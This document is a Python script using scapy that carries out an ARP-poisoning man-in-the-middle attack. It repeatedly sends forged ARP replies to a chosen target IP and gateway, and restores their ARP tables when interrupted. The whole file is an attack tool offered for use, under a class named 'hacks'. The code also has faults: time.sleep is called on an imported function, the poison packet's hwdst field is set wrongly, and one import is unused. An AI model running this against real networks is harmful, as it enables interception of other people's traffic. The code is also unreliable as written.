from cgitb import reset
from time import time
import scapy.all as scapy
import optparse


class hacks:
    

    def switcher(self):
        args = self.get_input()
        match args.approach_method:
            case "mitm":
                if not args.target_ip:
                    print("Enter Target ip")
                    exit(0)
                if not args.gateway_ip:
                    print("Enter gateway ip")
                    exit(0)
                self.mitm(args.target_ip, args.gateway_ip)

            case default:
                if not args.approach_method:
                    print("enter approach")
                else:
                    print("Not yet supported")
                    exit(0)

    def mitm(self,target_ip, gateway_ip):
        try:
            number = 0
            while True:
                self.arp_poison(target_ip, gateway_ip)
                self.arp_poison(gateway_ip, target_ip)

                number += 2

                print("\nsending packets "+ str(number), end="")
                time.sleep(3)
        
        except KeyboardInterrupt:
            print("\nQuiting and Reseting")
            self.reset_ops(target_ip, gateway_ip)
            self.reset_ops(gateway_ip, target_ip)
    
    def get_mac_address(self, ip):
        arp_packet = scapy.ARP(pdst=ip)
        broadcast_address = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        combined = broadcast_address / arp_packet
        answered_list = scapy.srp(combined, timeout=1, verbose=False)[0]
    
        return answered_list[0][1].hwsrc

    def arp_poison(self, target, target2):
        packet = scapy.ARP(op=2 ,psrc = target, pdst=target2, hwdst = self.get_mac_address(target))
        scapy.send(packet, verbose = False)
    
    def reset_ops(self, target1, target2):
        reset_arp= scapy.ARP(op=2, psrc= target1, pdst=target2, hwsrc=self.get_mac_address(target1), hwdst=self.get_mac_address(target2))
        scapy.send(reset_arp, verbose=False, count=6)

    def get_input(self):
        parse_object = optparse.OptionParser()
        parse_object.add_option("-a", "--attack", dest = "approach_method", help="Select which way to attack")
        parse_object.add_option("-t", "--target", dest = "target_ip", help="Enter Target ip")
        parse_object.add_option("-g", "--gateway", dest = "gateway_ip", help="enter gateway ip")
        
        options = parse_object.parse_args()[0]
        return options

if __name__ == '__main__':

    obj = hacks()
    obj.switcher()
    
